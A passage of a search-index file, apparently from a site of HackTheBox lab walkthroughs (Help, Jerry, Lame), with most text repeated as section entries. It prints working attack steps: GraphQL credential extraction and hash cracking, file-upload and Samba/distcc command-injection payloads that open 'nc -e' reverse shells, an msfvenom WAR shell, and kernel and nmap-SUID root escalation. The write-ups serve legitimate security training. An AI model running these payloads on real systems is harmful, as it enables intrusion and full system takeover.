linux/local/44298.c ------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Compile exploit linux/local/44298.c and run it in the server, I got root. help@help:/tmp$ gcc -o 44298 44298.c help@help:/tmp$ ./44298 task_struct = ffff88003a99b800 uidptr = ffff88001ba61984 spawning root shell root@help:/tmp# id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)","title":"HTB Help"},{"location":"walkthrough/hackthebox/Help/index.html#hackthebox-help","text":"Author: Hades Scripting here","title":"HackTheBox Help"},{"location":"walkthrough/hackthebox/Help/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Help/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.10.121 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 22,80,3000 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.121 -p22,80,3000 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 15:27 +07 Nmap scan report for 10.10.10.121 Host is up (0.27s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA) | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) |_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 3000/tcp open http Node.js Express framework |_http-title: Site doesn't have a title (application/json; charset=utf-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.80 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Help/index.html#help-desk-software","text":"Port 80 is apache service, after enum hidden uri in with gobuster, there is a Help Desk Software in /support [+] Files and directories gobuster dir -k -u http://10.10.10.121:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> /support (Status: 301) [Size: 314] [--> http://10.10.10.121/support/] After review the source code of HelpDeskZ, I go to /UPGRADING.txt to check the version. \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:33.7]~/scripting \u2514\u2500$ curl 10.10.10.121/support/UPGRADING.txt Welcome to HelpDeskZ 1.0.2 ========================== Search public exploit, there are 2 exploit for HelpDeskZ 1.0.2 \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:32.7]~/scripting \u2514\u2500$ searchsploit HelpDeskZ 1.0.2 ------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------- --------------------------------- HelpDeskZ 1.0.2 - Arbitrary File Upload | php/webapps/40300.py HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized F | php/webapps/41200.py ------------------------------------------------------------------- --------------------------------- Shellcodes: No Results","title":"Help Desk Software"},{"location":"walkthrough/hackthebox/Help/index.html#nodejs-express-api","text":"Checking port 3000, it return message guide user Shiv find the credentials with given query \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:32.7]~/scripting \u2514\u2500$ curl 10.10.10.121:3000 {\"message\":\"Hi Shiv, To get access please find the credentials with given query\"} Based on result of nmap , Port 3000 is Node.js Express framework . After searching, I found Running an Express GraphQL Server and defind Graphql at http://localhost:4000/graphql in the documents. \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:36.7]~/scripting \u2514\u2500$ curl 10.10.10.121:3000/graphql GET query missing. Add query and grab a banner \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:32.8]~/scripting \u2514\u2500$ curl '10.10.10.121:3000/graphql?query=\\{__schema\\{types\\{name,fields\\{name\\}\\}\\}\\}' --silent | python -m json.tool { \"data\": { \"__schema\": { \"types\": [ { \"fields\": [ { \"name\": \"user\" } ], \"name\": \"Query\" }, { \"fields\": [ { \"name\": \"username\" }, { \"name\": \"password\" } ], \"name\": \"User\" }, <snip> Using grabhql query, I got the value of username and password \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:32.6]~/scripting \u2514\u2500$ curl '10.10.10.121:3000/graphql?query=\\{user\\{username,password\\}\\}' --silent | python -m json.tool { \"data\": { \"user\": { \"password\": \"5d3c93182bb20f07b994a7f617e99cff\", \"username\": \"helpme@helpme.com\" } } } Cracking md5 hash with john \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:32.7]~/walkthrough/hackthebox/help \u2514\u2500$ john hash --wordlist=/home/kali/directory/rockyou.txt --format=raw-md5 <snip> godhelpmeplz (?) <snip> Login successfully to HelpDeskZ at port 80.","title":"Node.js Express API"},{"location":"walkthrough/hackthebox/Help/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Help/index.html#helpdeskz-file-upload","text":"Follow exploit php/webapps/40300.py . First, upload reverse shell php to server at url http://10.10.10.121/support/?v=submit_ticket&action=displayForm Trigger file shell at /uploads/tickets/ using exploit 40300.py . \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:27.2]~/walkthrough/hackthebox/help \u2514\u2500$ python 40300.py 'http://10.10.10.121/support/uploads/tickets/' php-reverse-shell.php Helpdeskz v1.0.2 - Unauthenticated shell upload exploit <snip> http://10.10.10.121/support/uploads/tickets/014a4af342600e47719c9c6eb22c483e.php At listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:26.0]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.6] from (UNKNOWN) [10.10.10.121] 60166 Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 03:44:05 up 1:40, 0 users, load average: 0.09, 0.04, 0.01 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare) /bin/sh: 0: can't access tty; job control turned off $ id uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)","title":"HelpDeskZ File Upload"},{"location":"walkthrough/hackthebox/Help/index.html#authenticated-sql-inj","text":"","title":"(Authenticated) SQL Inj"},{"location":"walkthrough/hackthebox/Help/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Help/index.html#linux-kernel-440-116","text":"Checking kernel, server is using Linux Kernel 4.4.0-116. help@help:/tmp$ uname -a Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux Search public exploit and I have linux/local/44298.c \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.1:27.2]~/walkthrough \u2514\u2500$ searchsploit 4.4.0-116 ------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------- --------------------------------- Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escala | linux/local/44298.c ------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Compile exploit linux/local/44298.c and run it in the server, I got root. help@help:/tmp$ gcc -o 44298 44298.c help@help:/tmp$ ./44298 task_struct = ffff88003a99b800 uidptr = ffff88001ba61984 spawning root shell root@help:/tmp# id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)","title":"Linux Kernel &lt; 4.4.0-116"},{"location":"walkthrough/hackthebox/Jerry/index.html","text":"HackTheBox Jerry Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.95 [+] Openning ports: 8080 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.95 -p8080 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-06 14:09 +07 Nmap scan report for 10.10.10.95 Host is up (0.25s latency). PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.30 seconds Apache Tomcat/7.0.88 At port 8080, it is Tomcat's home page. At manager page http://10.10.10.95:8080/manager/html , I try to login with defaul credential tomcat:s3cret and I got admin. Foothold WAR file upload Create shell.war using msfvenom to deploy in tomcat server. msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war > shell.war Upload file shell.war and deploy it. Execute web shell and got the reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:45.9]~/walkthrough/hackthebox/jerry \u2514\u2500$ curl http://10.10.10.95:8080/shell/ At listener, I got system shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:46.0]~ \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.95] 49192 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\apache-tomcat-7.0.88>whoami whoami nt authority\\system","title":"HTB Jerry"},{"location":"walkthrough/hackthebox/Jerry/index.html#hackthebox-jerry","text":"Author: Hades Scripting here","title":"HackTheBox Jerry"},{"location":"walkthrough/hackthebox/Jerry/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Jerry/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.95 [+] Openning ports: 8080 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.95 -p8080 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-06 14:09 +07 Nmap scan report for 10.10.10.95 Host is up (0.25s latency). PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.30 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Jerry/index.html#apache-tomcat7088","text":"At port 8080, it is Tomcat's home page. At manager page http://10.10.10.95:8080/manager/html , I try to login with defaul credential tomcat:s3cret and I got admin.","title":"Apache Tomcat/7.0.88"},{"location":"walkthrough/hackthebox/Jerry/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Jerry/index.html#war-file-upload","text":"Create shell.war using msfvenom to deploy in tomcat server. msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war > shell.war Upload file shell.war and deploy it. Execute web shell and got the reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:45.9]~/walkthrough/hackthebox/jerry \u2514\u2500$ curl http://10.10.10.95:8080/shell/ At listener, I got system shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:46.0]~ \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.95] 49192 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\apache-tomcat-7.0.88>whoami whoami nt authority\\system","title":"WAR file upload"},{"location":"walkthrough/hackthebox/Lame/index.html","text":"HackTheBox Lame Author: Hades Scripting here Information Gathering Openning Services To scan all open ports in WinterMute I run nmap with -p- options and enum service at each port. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:12.3]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.3 ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.3 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 21,22,139,445,3632 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.3 -p21,22,139,445,3632 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 11:07 EDT Nmap scan report for 10.10.10.3 Host is up (0.25s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.5 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 2h14m22s, deviation: 2h49m46s, median: 14m19s | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2021-03-31T11:22:07-04:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 75.03 seconds vsftpd 2.3.4 Anonymous access \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[2.1:15.9]~ \u2514\u2500$ ftp 10.10.10.3 Connected to 10.10.10.3. 220 (vsFTPd 2.3.4) Name (10.10.10.3:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp> ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 65534 4096 Mar 17 2010 . drwxr-xr-x 2 0 65534 4096 Mar 17 2010 .. 226 Directory send OK. ftp> pwd 257 \"/\" ftp> quit 221 Goodbye. Searchsploit \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[2.7:16.6]~ \u2514\u2500$ searchsploit vsftpd 2.3.4 ----------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------- --------------------------------- vsftpd 2.3.4 - Backdoor Command Execution (Met | unix/remote/17491.rb ----------------------------------------------- --------------------------------- Shellcodes: No Results Samba smbd 3.0.20-Debian ### SMB Enumeration (445) ############################ smbmap -H 10.10.10.3 [+] IP: 10.10.10.3:445 Name: 10.10.10.3 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers tmp READ, WRITE oh noes! opt NO ACCESS IPC$ NO ACCESS IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ NO ACCESS IPC Service (lame server (Samba 3.0.20-Debian)) smbclient -L 10.10.10.3 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED Access to folder tmp using smbclient but the server disconnect this session. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:13.9]~ \u2514\u2500$ smbclient //10.10.10.3/tmp protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED Searchsploit \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:13.5]~/walkthrough/hackthebox/lame \u2514\u2500$ searchsploit Samba 3.0.20 ------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------- --------------------------------- <snip> Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Ex | unix/remote/16320.rb <snip> ------------------------------------------------------------- --------------------------------- Shellcodes: No Results distccd v1 ((GNU) 4.2.4 Check if it's vulnerable to CVE-2004-2687 to execute arbitrary code: 3632 - Pentesting distcc \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:13.9]~ \u2514\u2500$ sudo nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 22:17 EDT Nmap scan report for 10.10.10.3 Host is up (0.25s latency). PORT STATE SERVICE 3632/tcp open distccd | distcc-cve2004-2687: | VULNERABLE: | distcc Daemon Command Execution | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2004-2687 | Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C) | Allows executing of arbitrary commands on systems running distccd 3.1 and | earlier. The vulnerability is the consequence of weak service configuration. | | Disclosure date: 2002-02-01 | Extra information: | | uid=1(daemon) gid=1(daemon) groups=1(daemon) | | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687 | https://nvd.nist.gov/vuln/detail/CVE-2004-2687 |_ https://distcc.github.io/security.html Nmap done: 1 IP address (1 host up) scanned in 1.62 seconds Foothold vsftpd-2.3.4-exploit Poc code here Base on searchsploit , we know the vsftpd 2.3.4 service had a critical vul allowing attacker to execute command in the server. Backdoor Command Execution , this exploit trigger vsftpd 2.3.4 backdoor on port 6200 and prints supplied command's output. Payload: USER letmein:) . Execute payload python3 vsftpd-2.3.4-exploit.py 10.10.10.3 21 whoami Check open port: 6200 nmap -p 6200 10.10.10.3 -Pn Because port 6200 is not open, then we don't have a backdoor in Lame server. CVE-2007-2447 Poc code here Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution . The payload execute command ` in the username. Create a listener in Kali machine. sudo nc -nvlp 4444 Get reverse shell smbmap -u '/=`nc -e /bin/bash 10.10.14.4 4444`' -H 10 .10.10.3 python3 samba_rce_CVE-2007-2447.py 10 .10.10.3 'nc -nv 10.10.14.5 443 -e /bin/sh' smb command samba_rce_CVE-2007-2447.py CVE-2004-2687 Poc code here Based on nmap script, I identify distcc-cve2004-2687 and search the public exploit DistCC Daemon - Command Execution (Python) Execute payload with ping command \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[1.5:16.3]~ \u2514\u2500$ python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c \"ping -c 2 10.10.14.4\" [OK] Connected to remote service --- BEGIN BUFFER --- PING 10.10.14.4 (10.10.14.4) 56(84) bytes of data. 64 bytes from 10.10.14.4: icmp_seq=1 ttl=63 time=235 ms 64 bytes from 10.10.14.4: icmp_seq=2 ttl=63 time=234 ms --- 10.10.14.4 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1005ms rtt min/avg/max/mdev = 234.636/235.127/235.618/0.491 ms --- END BUFFER --- [OK] Done. Create a listener in Kali machine. sudo nc -nvlp 4444 Get reverse shell python distccd_rce_CVE-2004-2687.py -t 10 .10.10.3 -p 3632 -c \"nc 10.10.14.64 4444 -e /bin/sh\" Privilege Escalation Nmap SUID Poc code here Using LinEnum.sh to audit Lame server. Exploit with GTFOBins nmap daemon@lame:/tmp$ find / -perm -u=s -type f 2>/dev/null find / -perm -u=s -type f 2>/dev/null <snip> /usr/bin/nmap <snip> Check nmap version daemon@lame:/root$ /usr/bin/nmap -V /usr/bin/nmap -V Nmap version 4.53 (http://insecure.org) Execute nmap to get root daemon@lame:/root$ /usr/bin/nmap --interactive /usr/bin/nmap --interactive Starting Nmap V. 4.53 ( http://insecure.org ) Welcome to Interactive Mode -- press h <enter> for help nmap> !sh !sh sh-3.2# whoami whoami root","title":"HTB Lame"},{"location":"walkthrough/hackthebox/Lame/index.html#hackthebox-lame","text":"Author: Hades Scripting here","title":"HackTheBox Lame"},{"location":"walkthrough/hackthebox/Lame/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Lame/index.html#openning-services","text":"To scan all open ports in WinterMute I run nmap with -p- options and enum service at each port. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:12.3]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.3 ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.3 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 21,22,139,445,3632 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.3 -p21,22,139,445,3632 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 11:07 EDT Nmap scan report for 10.10.10.3 Host is up (0.25s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.5 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 2h14m22s, deviation: 2h49m46s, median: 14m19s | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2021-03-31T11:22:07-04:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 75.03 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Lame/index.html#vsftpd-234","text":"Anonymous access \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[2.1:15.9]~ \u2514\u2500$ ftp 10.10.10.3 Connected to 10.10.10.3. 220 (vsFTPd 2.3.4) Name (10.10.10.3:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp> ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 65534 4096 Mar 17 2010 . drwxr-xr-x 2 0 65534 4096 Mar 17 2010 .. 226 Directory send OK. ftp> pwd 257 \"/\" ftp> quit 221 Goodbye. Searchsploit \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[2.7:16.6]~ \u2514\u2500$ searchsploit vsftpd 2.3.4 ----------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------- --------------------------------- vsftpd 2.3.4 - Backdoor Command Execution (Met | unix/remote/17491.rb ----------------------------------------------- --------------------------------- Shellcodes: No Results","title":"vsftpd 2.3.4"},{"location":"walkthrough/hackthebox/Lame/index.html#samba-smbd-3020-debian","text":"### SMB Enumeration (445) ############################ smbmap -H 10.10.10.3 [+] IP: 10.10.10.3:445 Name: 10.10.10.3 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers tmp READ, WRITE oh noes! opt NO ACCESS IPC$ NO ACCESS IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ NO ACCESS IPC Service (lame server (Samba 3.0.20-Debian)) smbclient -L 10.10.10.3 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED Access to folder tmp using smbclient but the server disconnect this session. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:13.9]~ \u2514\u2500$ smbclient //10.10.10.3/tmp protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED Searchsploit \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:13.5]~/walkthrough/hackthebox/lame \u2514\u2500$ searchsploit Samba 3.0.20 ------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------- --------------------------------- <snip> Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Ex | unix/remote/16320.rb <snip> ------------------------------------------------------------- --------------------------------- Shellcodes: No Results","title":"Samba smbd 3.0.20-Debian"},{"location":"walkthrough/hackthebox/Lame/index.html#distccd-v1-gnu-424","text":"Check if it's vulnerable to CVE-2004-2687 to execute arbitrary code: 3632 - Pentesting distcc \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:13.9]~ \u2514\u2500$ sudo nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 22:17 EDT Nmap scan report for 10.10.10.3 Host is up (0.25s latency). PORT STATE SERVICE 3632/tcp open distccd | distcc-cve2004-2687: | VULNERABLE: | distcc Daemon Command Execution | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2004-2687 | Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C) | Allows executing of arbitrary commands on systems running distccd 3.1 and | earlier. The vulnerability is the consequence of weak service configuration. | | Disclosure date: 2002-02-01 | Extra information: | | uid=1(daemon) gid=1(daemon) groups=1(daemon) | | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687 | https://nvd.nist.gov/vuln/detail/CVE-2004-2687 |_ https://distcc.github.io/security.html Nmap done: 1 IP address (1 host up) scanned in 1.62 seconds","title":"distccd v1 ((GNU) 4.2.4"},{"location":"walkthrough/hackthebox/Lame/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Lame/index.html#vsftpd-234-exploit","text":"Poc code here Base on searchsploit , we know the vsftpd 2.3.4 service had a critical vul allowing attacker to execute command in the server. Backdoor Command Execution , this exploit trigger vsftpd 2.3.4 backdoor on port 6200 and prints supplied command's output. Payload: USER letmein:) . Execute payload python3 vsftpd-2.3.4-exploit.py 10.10.10.3 21 whoami Check open port: 6200 nmap -p 6200 10.10.10.3 -Pn Because port 6200 is not open, then we don't have a backdoor in Lame server.","title":"vsftpd-2.3.4-exploit"},{"location":"walkthrough/hackthebox/Lame/index.html#cve-2007-2447","text":"Poc code here Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution . The payload execute command ` in the username. Create a listener in Kali machine. sudo nc -nvlp 4444 Get reverse shell smbmap -u '/=`nc -e /bin/bash 10.10.14.4 4444`' -H 10 .10.10.3 python3 samba_rce_CVE-2007-2447.py 10 .10.10.3 'nc -nv 10.10.14.5 443 -e /bin/sh' smb command samba_rce_CVE-2007-2447.py","title":"CVE-2007-2447"},{"location":"walkthrough/hackthebox/Lame/index.html#cve-2004-2687","text":"Poc code here Based on nmap script, I identify distcc-cve2004-2687 and search the public exploit DistCC Daemon - Command Execution (Python) Execute payload with ping command \u250c\u2500\u2500(Hades\u327f10.10.14.4)-[1.5:16.3]~ \u2514\u2500$ python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c \"ping -c 2 10.10.14.4\" [OK] Connected to remote service --- BEGIN BUFFER --- PING 10.10.14.4 (10.10.14.4) 56(84) bytes of data. 64 bytes from 10.10.14.4: icmp_seq=1 ttl=63 time=235 ms 64 bytes from 10.10.14.4: icmp_seq=2 ttl=63 time=234 ms --- 10.10.14.4 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1005ms rtt min/avg/max/mdev = 234.636/235.127/235.618/0.491 ms --- END BUFFER --- [OK] Done. Create a listener in Kali machine. sudo nc -nvlp 4444 Get reverse shell python distccd_rce_CVE-2004-2687.py -t 10 .10.10.3 -p 3632 -c \"nc 10.10.14.64 4444 -e /bin/sh\"","title":"CVE-2004-2687"},{"location":"walkthrough/hackthebox/Lame/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Lame/index.html#nmap-suid","text":"Poc code here Using LinEnum.sh to audit Lame server. Exploit with GTFOBins nmap daemon@lame:/tmp$ find / -perm -u=s -type f 2>/dev/null find / -perm -u=s -type f 2>/dev/null <snip> /usr/bin/nmap <snip> Check nmap version daemon@lame:/root$ /usr/bin/nmap -V /usr/bin/nmap -V Nmap version 4.53 (http://insecure.org) Execute nmap to get root daemon@lame:/root$ /usr/bin/nmap --interactive /usr/bin/nmap --interactive Starting Nmap V. 4.53 ( http://insecure.org ) Welcome to Interactive Mode -- press h <enter> for help nmap> !sh !sh sh-3.2# whoami whoami root","title":"Nmap SUID"},{"location":"walkthrough/hackthebox/Legacy/index.html","text":"HackTheBox Legacy Author: Hades Scripting here Information Gathering Openning Services \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:14.1]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.4 [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.4 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 139,445,3389 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.4 -p139,445,3389 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 23:38 EDT Nmap scan report for 10.10.10.4 Host is up (0.25s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows 